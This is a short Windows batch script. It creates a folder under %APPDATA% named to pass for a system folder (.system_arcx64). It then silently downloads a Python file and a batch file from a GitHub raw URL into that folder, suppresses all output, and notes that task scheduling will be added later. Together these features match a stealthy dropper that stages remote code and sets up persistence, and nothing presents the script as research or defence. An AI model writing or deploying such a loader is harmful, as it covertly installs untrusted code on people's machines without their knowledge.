@REM TODO: Scheduling the task will done in another phase

@echo off
set folderPath=%APPDATA%\.system_arcx64

if not exist "%folderPath%" (
    mkdir %folderPath%
)

@REM Download the files from  stable and secure source
curl https://raw.githubusercontent.com/testrepo/cheki/refs/heads/main/main.py -o %folderPath%\main.py > NUL 2>&1
curl https://raw.githubusercontent.com/testrepo/cheki/refs/heads/main/py_down.bat -o %folderPath%\py_donw.bat  > NUL 2>&1
